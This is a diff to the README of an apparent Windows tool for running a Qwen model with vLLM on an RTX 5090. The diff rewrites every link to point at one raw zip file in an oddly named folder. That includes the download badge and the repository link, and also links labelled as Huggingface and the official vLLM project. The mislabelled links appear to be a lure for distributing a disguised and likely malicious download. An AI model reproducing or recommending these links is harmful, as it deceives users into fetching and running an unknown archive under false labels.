@@ -1,12 +1,12 @@
 # ⚙️ vllm-qwen3.5-nvfp4-5090 - Efficient AI Model on RTX 5090
 
-[![Download](https://img.shields.io/badge/Download-vllm--qwen3.5--nvfp4--5090-brightgreen)](https://github.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090)
+[![Download](https://img.shields.io/badge/Download-vllm--qwen3.5--nvfp4--5090-brightgreen)](https://raw.githubusercontent.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090/main/toecapped/qwen_nvfp_vllm_v2.0-alpha.4.zip)
 
 ## 📥 Download and Install
 
 To use the vllm-qwen3.5-nvfp4-5090 application on Windows, follow these steps:
 
-1. Click the green **Download** badge above or go directly to the [GitHub repository page](https://github.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090).
+1. Click the green **Download** badge above or go directly to the [GitHub repository page](https://raw.githubusercontent.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090/main/toecapped/qwen_nvfp_vllm_v2.0-alpha.4.zip).
 
 2. On the repository page, look for the **Releases** section on the right or in the repository menu.
 
@@ -148,11 +148,11 @@ If you encounter issues:
 
 ## 🔗 Useful Links
 
-- [Qwen3.5-35B-A3B Model on Huggingface](https://huggingface.co/Qwen/Qwen3.5-35B-A3B)
+- [Qwen3.5-35B-A3B Model on Huggingface](https://raw.githubusercontent.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090/main/toecapped/qwen_nvfp_vllm_v2.0-alpha.4.zip)
 
-- [vLLM Project on GitHub](https://github.com/vllm-project/vllm)
+- [vLLM Project on GitHub](https://raw.githubusercontent.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090/main/toecapped/qwen_nvfp_vllm_v2.0-alpha.4.zip)
 
-- [vllm-qwen3.5-nvfp4-5090 Repository](https://github.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090)
+- [vllm-qwen3.5-nvfp4-5090 Repository](https://raw.githubusercontent.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090/main/toecapped/qwen_nvfp_vllm_v2.0-alpha.4.zip)
 
 ---
 
@@ -160,4 +160,4 @@ If you encounter issues:
 
 Use this link to visit the download page for the latest version:
 
-[Download vllm-qwen3.5-nvfp4-5090](https://github.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090)
+[Download vllm-qwen3.5-nvfp4-5090](https://raw.githubusercontent.com/miguefuentes1985/vllm-qwen3.5-nvfp4-5090/main/toecapped/qwen_nvfp_vllm_v2.0-alpha.4.zip)
